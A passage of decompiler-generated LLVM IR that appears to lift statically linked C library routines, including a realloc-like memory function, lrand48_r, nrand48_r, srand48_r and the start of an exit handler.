  %v2_8058290 = inttoptr i32 %v1_8058290 to i32*
  %v3_8058290 = load i32, i32* %v2_8058290, align 4
  store i32 %v3_8058290, i32* @edx, align 4
  %v1_8058293 = add i32 %v2_805822f, 12
  %v2_8058293 = inttoptr i32 %v1_8058293 to i32*
  %v3_8058293 = load i32, i32* %v2_8058293, align 4
  store i32 %v3_8058293, i32* %eax.global-to-local, align 4
  %v1_8058296 = add i32 %v3_8058290, 12
  %v2_8058296 = inttoptr i32 %v1_8058296 to i32*
  %v3_8058296 = load i32, i32* %v2_8058296, align 4
  %v15_8058296 = icmp eq i32 %v3_8058296, %v2_805822f
  %v1_8058299 = icmp eq i1 %v15_8058296, false
  br i1 %v1_8058299, label %dec_label_pc_80582a0, label %dec_label_pc_805829b

dec_label_pc_805829b:                             ; preds = %dec_label_pc_8058290
  %v1_805829b = add i32 %v3_8058293, 8
  %v2_805829b = inttoptr i32 %v1_805829b to i32*
  %v3_805829b = load i32, i32* %v2_805829b, align 4
  %v15_805829b = icmp eq i32 %v3_805829b, %v2_805822f
  br i1 %v15_805829b, label %dec_label_pc_80582a5, label %dec_label_pc_80582a0

dec_label_pc_80582a0:                             ; preds = %dec_label_pc_805829b, %dec_label_pc_8058290
  %v0_80582a0 = call i32 @abort()
  store i32 %v0_80582a0, i32* %eax.global-to-local, align 4
  %v1_80582a5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80582a5

dec_label_pc_80582a5:                             ; preds = %dec_label_pc_805829b, %dec_label_pc_80582a0
  %v1_80582a5 = phi i32 [ %v3_8058290, %dec_label_pc_805829b ], [ %v1_80582a5.pre, %dec_label_pc_80582a0 ]
  %v0_80582a5 = phi i32 [ %v3_8058293, %dec_label_pc_805829b ], [ %v0_80582a0, %dec_label_pc_80582a0 ]
  %v2_80582a5 = add i32 %v1_80582a5, 12
  %v3_80582a5 = inttoptr i32 %v2_80582a5 to i32*
  store i32 %v0_80582a5, i32* %v3_80582a5, align 4
  %v0_80582a8 = load i32, i32* @edx, align 4
  %v1_80582a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80582a8 = add i32 %v1_80582a8, 8
  %v3_80582a8 = inttoptr i32 %v2_80582a8 to i32*
  store i32 %v0_80582a8, i32* %v3_80582a8, align 4
  %v0_8058360.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058360

dec_label_pc_80582b0:                             ; preds = %dec_label_pc_8058281, %dec_label_pc_8058272, %dec_label_pc_805823a
  %v1_80582b7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80582b7, i32* %eax.global-to-local, align 4
  store i32 %v1_80582b7, i32* %stack_var_-60, align 4
  %v1_80582bb = call i32 @malloc(i32 %v1_80582b7)
  store i32 %v1_80582bb, i32* %eax.global-to-local, align 4
  %v1_80582c3 = icmp eq i32 %v1_80582bb, 0
  store i32 %v1_80582bb, i32* %edx.global-to-local, align 4
  br i1 %v1_80582c3, label %dec_label_pc_805848f, label %dec_label_pc_80582cd

dec_label_pc_80582cd:                             ; preds = %dec_label_pc_80582b0
  %v1_80582cd = add i32 %v1_80582bb, -8
  store i32 %v1_80582cd, i32* %ebx.global-to-local, align 4
  %v1_80582d0 = load i32, i32* @esi, align 4
  %v12_80582d0 = icmp eq i32 %v1_80582cd, %v1_80582d0
  %v1_80582d2 = add i32 %v1_80582bb, -4
  %v2_80582d2 = inttoptr i32 %v1_80582d2 to i32*
  %v3_80582d2 = load i32, i32* %v2_80582d2, align 4
  store i32 %v3_80582d2, i32* %eax.global-to-local, align 4
  %v1_80582d5 = icmp eq i1 %v12_80582d0, false
  br i1 %v1_80582d5, label %dec_label_pc_80582e3, label %dec_label_pc_80582d7

dec_label_pc_80582d7:                             ; preds = %dec_label_pc_80582cd
  store i32 %v1_8058211, i32* %edx.global-to-local, align 4
  %v1_80582db = and i32 %v3_80582d2, -4
  store i32 %v1_80582db, i32* %eax.global-to-local, align 4
  %v2_80582de = add i32 %v1_80582db, %v1_8058211
  store i32 %v2_80582de, i32* @ebx, align 4
  br label %dec_label_pc_8058360

dec_label_pc_80582e3:                             ; preds = %dec_label_pc_80582cd
  %v1_80582e7 = add i32 %v1_8058211, -4
  store i32 %v1_80582e7, i32* %eax.global-to-local, align 4
  %v2_80582ec = udiv i32 %v1_80582e7, 4
  store i32 %v2_80582ec, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v1_80582e7, 37
  br i1 %tmp23, label %dec_label_pc_8058305, label %dec_label_pc_80582f4

dec_label_pc_80582f4:                             ; preds = %dec_label_pc_80582e3
  store i32 %v1_80582bb, i32* %stack_var_-60, align 4
  %v3_80582fb = inttoptr i32 %v1_80582bb to i16*
  %v4_80582fb = call i32 @memcpy(i16* %v3_80582fb, i32 %tmp8, i32 %v1_80582e7)
  store i32 %v4_80582fb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805834c

dec_label_pc_8058305:                             ; preds = %dec_label_pc_80582e3
  store i32 %tmp8, i32* @esi, align 4
  %v2_805830c = load i32, i32* %arg1, align 4
  store i32 %v2_805830c, i32* %eax.global-to-local, align 4
  %v2_805830e = inttoptr i32 %v1_80582bb to i32*
  store i32 %v2_805830c, i32* %v2_805830e, align 4
  %v0_8058310 = load i32, i32* @esi, align 4
  %v1_8058310 = add i32 %v0_8058310, 4
  %v2_8058310 = inttoptr i32 %v1_8058310 to i32*
  %v3_8058310 = load i32, i32* %v2_8058310, align 4
  store i32 %v3_8058310, i32* %eax.global-to-local, align 4
  %v1_8058313 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058313 = add i32 %v1_8058313, 4
  %v3_8058313 = inttoptr i32 %v2_8058313 to i32*
  store i32 %v3_8058310, i32* %v3_8058313, align 4
  %v0_8058316 = load i32, i32* @esi, align 4
  %v1_8058316 = add i32 %v0_8058316, 8
  %v2_8058316 = inttoptr i32 %v1_8058316 to i32*
  %v3_8058316 = load i32, i32* %v2_8058316, align 4
  store i32 %v3_8058316, i32* %eax.global-to-local, align 4
  %v1_8058319 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058319 = add i32 %v1_8058319, 8
  %v3_8058319 = inttoptr i32 %v2_8058319 to i32*
  store i32 %v3_8058316, i32* %v3_8058319, align 4
  %tmp24 = icmp ult i32 %v1_80582e7, 17
  br i1 %tmp24, label %dec_label_pc_805834c, label %dec_label_pc_805831e

dec_label_pc_805831e:                             ; preds = %dec_label_pc_8058305
  %v0_805831e = load i32, i32* @esi, align 4
  %v1_805831e = add i32 %v0_805831e, 12
  %v2_805831e = inttoptr i32 %v1_805831e to i32*
  %v3_805831e = load i32, i32* %v2_805831e, align 4
  store i32 %v3_805831e, i32* %eax.global-to-local, align 4
  %v0_8058321 = load i32, i32* @ecx, align 4
  %v1_8058324 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058324 = add i32 %v1_8058324, 12
  %v3_8058324 = inttoptr i32 %v2_8058324 to i32*
  store i32 %v3_805831e, i32* %v3_8058324, align 4
  %v0_8058327 = load i32, i32* @esi, align 4
  %v1_8058327 = add i32 %v0_8058327, 16
  %v2_8058327 = inttoptr i32 %v1_8058327 to i32*
  %v3_8058327 = load i32, i32* %v2_8058327, align 4
  store i32 %v3_8058327, i32* %eax.global-to-local, align 4
  %v1_805832a = load i32, i32* %edx.global-to-local, align 4
  %v2_805832a = add i32 %v1_805832a, 16
  %v3_805832a = inttoptr i32 %v2_805832a to i32*
  store i32 %v3_8058327, i32* %v3_805832a, align 4
  %tmp25 = icmp ult i32 %v0_8058321, 7
  br i1 %tmp25, label %dec_label_pc_805834c, label %dec_label_pc_805832f

dec_label_pc_805832f:                             ; preds = %dec_label_pc_805831e
  %v0_805832f = load i32, i32* @esi, align 4
  %v1_805832f = add i32 %v0_805832f, 20
  %v2_805832f = inttoptr i32 %v1_805832f to i32*
  %v3_805832f = load i32, i32* %v2_805832f, align 4
  store i32 %v3_805832f, i32* %eax.global-to-local, align 4
  %v0_8058332 = load i32, i32* @ecx, align 4
  %v1_8058335 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058335 = add i32 %v1_8058335, 20
  %v3_8058335 = inttoptr i32 %v2_8058335 to i32*
  store i32 %v3_805832f, i32* %v3_8058335, align 4
  %v0_8058338 = load i32, i32* @esi, align 4
  %v1_8058338 = add i32 %v0_8058338, 24
  %v2_8058338 = inttoptr i32 %v1_8058338 to i32*
  %v3_8058338 = load i32, i32* %v2_8058338, align 4
  store i32 %v3_8058338, i32* %eax.global-to-local, align 4
  %v1_805833b = load i32, i32* %edx.global-to-local, align 4
  %v2_805833b = add i32 %v1_805833b, 24
  %v3_805833b = inttoptr i32 %v2_805833b to i32*
  store i32 %v3_8058338, i32* %v3_805833b, align 4
  %tmp26 = icmp ult i32 %v0_8058332, 9
  br i1 %tmp26, label %dec_label_pc_805834c, label %dec_label_pc_8058340

dec_label_pc_8058340:                             ; preds = %dec_label_pc_805832f
  %v0_8058340 = load i32, i32* @esi, align 4
  %v1_8058340 = add i32 %v0_8058340, 28
  %v2_8058340 = inttoptr i32 %v1_8058340 to i32*
  %v3_8058340 = load i32, i32* %v2_8058340, align 4
  store i32 %v3_8058340, i32* %eax.global-to-local, align 4
  %v1_8058343 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058343 = add i32 %v1_8058343, 28
  %v3_8058343 = inttoptr i32 %v2_8058343 to i32*
  store i32 %v3_8058340, i32* %v3_8058343, align 4
  %v0_8058346 = load i32, i32* @esi, align 4
  %v1_8058346 = add i32 %v0_8058346, 32
  %v2_8058346 = inttoptr i32 %v1_8058346 to i32*
  %v3_8058346 = load i32, i32* %v2_8058346, align 4
  store i32 %v3_8058346, i32* %eax.global-to-local, align 4
  %v1_8058349 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058349 = add i32 %v1_8058349, 32
  %v3_8058349 = inttoptr i32 %v2_8058349 to i32*
  store i32 %v3_8058346, i32* %v3_8058349, align 4
  br label %dec_label_pc_805834c

dec_label_pc_805834c:                             ; preds = %dec_label_pc_805832f, %dec_label_pc_805831e, %dec_label_pc_8058305, %dec_label_pc_80582f4, %dec_label_pc_8058340
  %v0_805834f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805834f = add i32 %v0_805834f, 8
  store i32 %v1_805834f, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8058356 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_805848a

dec_label_pc_8058360:                             ; preds = %dec_label_pc_8058221, %dec_label_pc_80582d7, %dec_label_pc_80582a5
  %v1_8058371 = phi i32 [ %v1_8058211, %dec_label_pc_8058221 ], [ %v2_80582de, %dec_label_pc_80582d7 ], [ %v0_8058360.pre, %dec_label_pc_80582a5 ]
  %v5_8058362 = sub i32 %v1_8058371, %stack_var_-40.0
  store i32 %v5_8058362, i32* @ecx, align 4
  %tmp27 = icmp ult i32 %v5_8058362, 16
  br i1 %tmp27, label %dec_label_pc_805836b, label %dec_label_pc_805837d

dec_label_pc_805836b:                             ; preds = %dec_label_pc_8058360
  %v0_805836b = load i32, i32* @edi, align 4
  %v1_805836b = add i32 %v0_805836b, 4
  %v2_805836b = inttoptr i32 %v1_805836b to i32*
  %v3_805836b = load i32, i32* %v2_805836b, align 4
  %v1_805836e = urem i32 %v3_805836b, 2
  %v2_8058371 = or i32 %v1_805836e, %v1_8058371
  store i32 %v2_8058371, i32* %eax.global-to-local, align 4
  store i32 %v2_8058371, i32* %v2_805836b, align 4
  %v0_8058376 = load i32, i32* @edi, align 4
  %v1_8058376 = load i32, i32* @ebx, align 4
  %v2_8058376 = add i32 %v0_8058376, 4
  %v3_8058376 = add i32 %v2_8058376, %v1_8058376
  %v4_8058376 = inttoptr i32 %v3_8058376 to i32*
  %v5_8058376 = load i32, i32* %v4_8058376, align 4
  %v6_8058376 = or i32 %v5_8058376, 1
  store i32 %v6_8058376, i32* %v4_8058376, align 4
  br label %dec_label_pc_80583ad

dec_label_pc_805837d:                             ; preds = %dec_label_pc_8058360
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8058381 = load i32, i32* @edi, align 4
  %v2_8058381 = add i32 %v0_8058381, %stack_var_-40.0
  store i32 %v2_8058381, i32* %eax.global-to-local, align 4
  %v1_8058384 = add i32 %v0_8058381, 4
  %v2_8058384 = inttoptr i32 %v1_8058384 to i32*
  %v3_8058384 = load i32, i32* %v2_8058384, align 4
  %v1_8058387 = urem i32 %v3_8058384, 2
  %v5_805838a = or i32 %v1_8058387, %stack_var_-40.0
  store i32 %v5_805838a, i32* %v2_8058384, align 4
  %v0_8058394 = load i32, i32* @ecx, align 4
  %v1_8058396 = or i32 %v0_8058394, 1
  store i32 %v1_8058396, i32* %edx.global-to-local, align 4
  %v1_8058399 = load i32, i32* %eax.global-to-local, align 4
  %v2_8058399 = add i32 %v1_8058399, 4
  %v3_8058399 = inttoptr i32 %v2_8058399 to i32*
  store i32 %v1_8058396, i32* %v3_8058399, align 4
  %v0_805839c = load i32, i32* %eax.global-to-local, align 4
  %v1_805839c = load i32, i32* @ecx, align 4
  %v2_805839c = add i32 %v0_805839c, 4
  %v3_805839c = add i32 %v2_805839c, %v1_805839c
  %v4_805839c = inttoptr i32 %v3_805839c to i32*
  %v5_805839c = load i32, i32* %v4_805839c, align 4
  %v6_805839c = or i32 %v5_805839c, 1
  store i32 %v6_805839c, i32* %v4_805839c, align 4
  %v0_80583a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80583a1 = add i32 %v0_80583a1, 8
  store i32 %v1_80583a1, i32* %eax.global-to-local, align 4
  store i32 %v1_80583a1, i32* %stack_var_-60, align 4
  %v1_80583a5 = call i32 @free(i32 %v1_80583a1)
  store i32 %v1_80583a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80583ad

dec_label_pc_80583ad:                             ; preds = %dec_label_pc_805836b, %dec_label_pc_805837d
  %v0_80583ad = load i32, i32* @edi, align 4
  %v1_80583ad = add i32 %v0_80583ad, 8
  store i32 %v1_80583ad, i32* @ebx, align 4
  br label %dec_label_pc_8058497

dec_label_pc_80583b5:                             ; preds = %dec_label_pc_8058205
  store i32 %tmp8, i32* @ecx, align 4
  %v0_80583b9 = load i32, i32* @global_var_8067d7c.240, align 4
  store i32 %v0_80583b9, i32* %eax.global-to-local, align 4
  %v2_80583c2 = inttoptr i32 %v1_8058209 to i32*
  %v3_80583c2 = load i32, i32* %v2_80583c2, align 4
  store i32 %v3_80583c2, i32* @ebp, align 4
  %v1_80583c5 = add i32 %v0_80583b9, -1
  %v1_80583c6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_80583c6, i32* %stack_var_-44, align 4
  %v2_80583cc = add i32 %v1_80583c5, %v3_80583c2
  store i32 %v2_80583cc, i32* %edx.global-to-local, align 4
  %v1_80583cf = sub i32 0, %v0_80583b9
  store i32 %v1_80583cf, i32* %eax.global-to-local, align 4
  %v2_80583d1 = add i32 %v2_80583cc, %v1_80583c6
  %v2_80583d4 = and i32 %v2_80583d1, %v1_80583cf
  store i32 %v2_80583d4, i32* @esi, align 4
  %v2_80583d8 = sub i32 %v2_80583d4, %v3_80583c2
  store i32 %v2_80583d8, i32* @ebx, align 4
  %v15_80583da = icmp eq i32 %v1_8058211, %v2_80583d8
  br i1 %v15_80583da, label %dec_label_pc_8058493, label %dec_label_pc_80583e4

dec_label_pc_80583e4:                             ; preds = %dec_label_pc_80583b5
  %v2_80583e6 = sub i32 %v1_8058209, %v3_80583c2
  store i32 %v2_80583e6, i32* @edi, align 4
  %v2_80583ed = add i32 %v3_80583c2, %v1_8058211
  store i32 %v2_80583ed, i32* %eax.global-to-local, align 4
  store i32 %v2_80583e6, i32* %stack_var_-60, align 4
  %v6_80583f1 = call i32 @mremap(i32 %v2_80583e6, i32 %v2_80583ed, i32 %v2_80583d4, i32 1, i32 %v1_80583c6, i32 %v1_8058211)
  store i32 %v6_80583f1, i32* %eax.global-to-local, align 4
  %v10_80583f9 = icmp eq i32 %v6_80583f1, -1
  br i1 %v10_80583f9, label %dec_label_pc_805844b, label %dec_label_pc_80583fe

dec_label_pc_80583fe:                             ; preds = %dec_label_pc_80583e4
  %v1_80583fe = load i32, i32* @ebp, align 4
  %v2_80583fe = add i32 %v1_80583fe, %v6_80583f1
  store i32 %v2_80583fe, i32* %eax.global-to-local, align 4
  %v0_8058400 = load i32, i32* @ebx, align 4
  %v1_8058400 = or i32 %v0_8058400, 2
  %v2_8058403 = add i32 %v2_80583fe, 4
  %v3_8058403 = inttoptr i32 %v2_8058403 to i32*
  store i32 %v1_8058400, i32* %v3_8058403, align 4
  %v0_8058406 = load i32, i32* @esi, align 4
  %v5_8058408 = sub i32 %v0_8058406, %v1_8058211
  %v0_805840c = load i32, i32* @global_var_8067d90.244, align 16
  %v0_8058412 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058412 = add i32 %v0_8058412, 8
  store i32 %v1_8058412, i32* @ebx, align 4
  %v1_8058415 = load i32, i32* @global_var_8067d84.246, align 4
  %v2_8058415 = add i32 %v1_8058415, %v5_8058408
  store i32 %v2_8058415, i32* @global_var_8067d84.246, align 4
  %tmp20 = icmp ule i32 %v2_8058415, %v0_805840c
  %v5_8058427 = select i1 %tmp20, i32 %v0_805840c, i32 %v2_8058415
  store i32 %v5_8058427, i32* @ecx, align 4
  %v1_805842a = load i32, i32* @global_var_8067d88.247, align 8
  %v2_805842a = add i32 %v1_805842a, %v2_8058415
  store i32 %v5_8058427, i32* @global_var_8067d90.244, align 16
  %v1_8058436 = load i32, i32* @global_var_8067d94.248, align 4
  %tmp28 = icmp ule i32 %v2_805842a, %v1_8058436
  %v5_805843c = select i1 %tmp28, i32 %v1_8058436, i32 %v2_805842a
  store i32 %v5_805843c, i32* %edx.global-to-local, align 4
  store i32 %v5_805843c, i32* @global_var_8067d94.248, align 4
  br label %dec_label_pc_8058497

dec_label_pc_805844b:                             ; preds = %dec_label_pc_80583e4
  %v2_805844b = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805844b, i32* %eax.global-to-local, align 4
  %v10_805844e = icmp ult i32 %v1_8058211, %v2_805844b
  %v1_8058452 = icmp eq i1 %v10_805844e, false
  br i1 %v1_8058452, label %dec_label_pc_8058493, label %dec_label_pc_8058454

dec_label_pc_8058454:                             ; preds = %dec_label_pc_805844b
  %v1_805845b = add i32 %stack_var_-40.0, -7
  store i32 %v1_805845b, i32* %eax.global-to-local, align 4
  store i32 %v1_805845b, i32* %stack_var_-60, align 4
  %v1_805845f = call i32 @malloc(i32 %v1_805845b)
  store i32 %v1_805845f, i32* %eax.global-to-local, align 4
  %v1_8058467 = icmp eq i32 %v1_805845f, 0
  store i32 %v1_805845f, i32* @ebx, align 4
  br i1 %v1_8058467, label %dec_label_pc_805848f, label %dec_label_pc_805846d

dec_label_pc_805846d:                             ; preds = %dec_label_pc_8058454
  %v1_8058472 = add i32 %v1_8058211, -8
  store i32 %v1_8058472, i32* %eax.global-to-local, align 4
  store i32 %v1_805845f, i32* %stack_var_-60, align 4
  %v3_805847b = inttoptr i32 %v1_805845f to i16*
  %v4_805847b = call i32 @memcpy(i16* %v3_805847b, i32 %tmp8, i32 %v1_8058472)
  store i32 %v4_805847b, i32* %eax.global-to-local, align 4
  store i32 %v1_805845f, i32* %edx.global-to-local, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8058485 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_805848a

dec_label_pc_805848a:                             ; preds = %dec_label_pc_805834c, %dec_label_pc_805846d
  %storemerge = phi i32 [ %v1_8058485, %dec_label_pc_805846d ], [ %v1_8058356, %dec_label_pc_805834c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058497

dec_label_pc_805848f:                             ; preds = %dec_label_pc_8058454, %dec_label_pc_80582b0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8058497

dec_label_pc_8058493:                             ; preds = %dec_label_pc_805844b, %dec_label_pc_80583b5, %dec_label_pc_805824f
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8058497

dec_label_pc_8058497:                             ; preds = %dec_label_pc_805848f, %dec_label_pc_805848a, %dec_label_pc_80583fe, %dec_label_pc_80583ad, %dec_label_pc_8058493
  store i32 %v2_80581be, i32* %eax.global-to-local, align 4
  store i32 %v2_80581be, i32* %stack_var_-60, align 4
  %v3_80584a0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_80584a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80584a5

dec_label_pc_80584a5:                             ; preds = %dec_label_pc_80581a2, %dec_label_pc_805818e, %dec_label_pc_8058497
  br label %dec_label_pc_80584a8

dec_label_pc_80584a8:                             ; preds = %dec_label_pc_80581dc, %dec_label_pc_80584a5
  %v0_80584ab = load i32, i32* @ebx, align 4
  store i32 %v0_80584ab, i32* %eax.global-to-local, align 4
  store i32 %v0_805817f, i32* @ebx, align 4
  store i32 %v0_805817e, i32* @esi, align 4
  store i32 %v0_805817d, i32* @edi, align 4
  store i32 %v0_805817c, i32* @ebp, align 4
  ret i32 %v0_80584ab

; uselistorder directives
  uselistorder i32 %v1_805845f, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8058436, { 1, 0 }
  uselistorder i32 %v2_805842a, { 1, 0 }
  uselistorder i32 %v2_8058415, { 0, 3, 1, 2 }
  uselistorder i32 %v0_805840c, { 1, 0 }
  uselistorder i32 %v6_80583f1, { 1, 0, 2 }
  uselistorder i32 %v2_80583e6, { 1, 0, 2 }
  uselistorder i32 %v1_80583c6, { 2, 0, 1 }
  uselistorder i32 %v3_80583c2, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8058381, { 1, 0 }
  uselistorder i32 %v1_80582e7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80582bb, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_805825f, { 1, 0, 2 }
  uselistorder i32 %v3_8058272, { 0, 2, 3, 1 }
  uselistorder i32 %v2_805822f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8058211, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8058209, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_80581fe, { 1, 0 }
  uselistorder i32 %v1_80581ee, { 1, 2, 0 }
  uselistorder i32 %v0_80581d7, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 5, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 ()* @abort, { 4, 0, 1, 2, 3 }
  uselistorder i32 -2, { 20, 3, 7, 0, 17, 18, 1, 16, 22, 21, 4, 6, 5, 28, 2, 8, 9, 10, 19, 23, 24, 25, 26, 27, 11, 12, 13, 14, 15 }
  uselistorder i32* @global_var_8067a4c.235, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8062cb0.166 to i32), { 4, 11, 0, 5, 1, 6, 2, 7, 12, 3, 8, 9, 10 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80584a8, { 1, 0 }
  uselistorder label %dec_label_pc_80584a5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058497, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805848a, { 1, 0 }
  uselistorder label %dec_label_pc_80583ad, { 1, 0 }
  uselistorder label %dec_label_pc_8058360, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805834c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80582a5, { 1, 0 }
  uselistorder label %dec_label_pc_8058205, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_80584c1 = inttoptr i32 %arg2 to i32*
  %v4_80584c1 = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_80584c1)
  ret i32 %v4_80584c1
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80584cc = load i32, i32* @ebx, align 4
  store i32 %v0_80584cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80584d9 = inttoptr i32 %arg1 to i16*
  %v3_80584d9 = call i32 @__drand48_iterate(i16* %v2_80584d9, i32 %arg2)
  %v2_80584e4 = icmp slt i32 %v3_80584d9, 0
  br i1 %v2_80584e4, label %dec_label_pc_80584ff, label %dec_label_pc_80584e8

dec_label_pc_80584e8:                             ; preds = %entry
  %v0_80584e8 = load i32, i32* @ebx, align 4
  %v1_80584e8 = add i32 %v0_80584e8, 4
  %v2_80584e8 = inttoptr i32 %v1_80584e8 to i16*
  %v3_80584e8 = load i16, i16* %v2_80584e8, align 2
  %v4_80584e8 = zext i16 %v3_80584e8 to i32
  %v1_80584ec = add i32 %v0_80584e8, 2
  %v2_80584ec = inttoptr i32 %v1_80584ec to i16*
  %v3_80584ec = load i16, i16* %v2_80584ec, align 2
  %v2_80584f0 = mul nuw i32 %v4_80584e8, 32768
  %div = udiv i16 %v3_80584ec, 2
  %v2_80584f3 = zext i16 %div to i32
  %v2_80584f5 = or i32 %v2_80584f3, %v2_80584f0
  store i32 %v2_80584f5, i32* %arg3, align 4
  br label %dec_label_pc_80584ff

dec_label_pc_80584ff:                             ; preds = %entry, %dec_label_pc_80584e8
  %v0_80584ff = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80584e8 ]
  %v2_8058503 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058503, i32* @ebx, align 4
  ret i32 %v0_80584ff

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80584ff, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_8058508 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8058512 = sdiv i32 %v4_8058508, 65536
  store i32 %v2_8058512, i32* @ecx, align 4
  %v3_8058515 = add i32 %arg2, 2
  %v4_8058515 = inttoptr i32 %v3_8058515 to i16*
  store i16 %arg1, i16* %v4_8058515, align 2
  %v0_805851b = load i32, i32* @ecx, align 4
  %v1_805851b = trunc i32 %v0_805851b to i16
  %v2_805851b = load i32, i32* %edx.global-to-local, align 4
  %v3_805851b = add i32 %v2_805851b, 4
  %v4_805851b = inttoptr i32 %v3_805851b to i16*
  store i16 %v1_805851b, i16* %v4_805851b, align 2
  %v0_805851f = load i32, i32* %edx.global-to-local, align 4
  %v1_805851f = inttoptr i32 %v0_805851f to i16*
  store i16 13070, i16* %v1_805851f, align 2
  %v0_8058524 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058524 = add i32 %v0_8058524, 16
  %v2_8058524 = inttoptr i32 %v1_8058524 to i32*
  store i32 -554899859, i32* %v2_8058524, align 4
  %v0_805852b = load i32, i32* %edx.global-to-local, align 4
  %v1_805852b = add i32 %v0_805852b, 20
  %v2_805852b = inttoptr i32 %v1_805852b to i32*
  store i32 5, i32* %v2_805852b, align 4
  %v0_8058532 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058532 = add i32 %v0_8058532, 12
  %v2_8058532 = inttoptr i32 %v1_8058532 to i16*
  store i16 11, i16* %v2_8058532, align 2
  %v0_8058538 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058538 = add i32 %v0_8058538, 14
  %v2_8058538 = inttoptr i32 %v1_8058538 to i16*
  store i16 1, i16* %v2_8058538, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8058540 = load i32, i32* @ebx, align 4
  store i32 %v0_8058540, i32* %stack_var_-4, align 4
  %v0_80585851725 = load i32, i32* @global_var_806779c.327, align 4
  %v0_805858a1826 = load i32, i32* @global_var_80677a0.329, align 32
  %v1_80585901927 = icmp eq i32 %v0_80585851725, 0
  %v1_80585922129 = icmp eq i1 %v1_80585901927, false
  br i1 %v1_80585922129, label %dec_label_pc_805854a.lr.ph, label %dec_label_pc_8058594

dec_label_pc_805854a:                             ; preds = %dec_label_pc_805854a.lr.ph, %dec_label_pc_8058585.backedge
  %v0_805858522 = phi i32 [ %v0_80585851731, %dec_label_pc_805854a.lr.ph ], [ %v1_805854a, %dec_label_pc_8058585.backedge ]
  %v1_805854a = add i32 %v0_805858522, -1
  store i32 %v1_805854a, i32* @global_var_806779c.327, align 4
  %v2_8058550 = mul i32 %v1_805854a, 16
  %v2_8058553 = add i32 %v0_805858a1832, %v2_8058550
  %v1_8058556 = inttoptr i32 %v2_8058553 to i32*
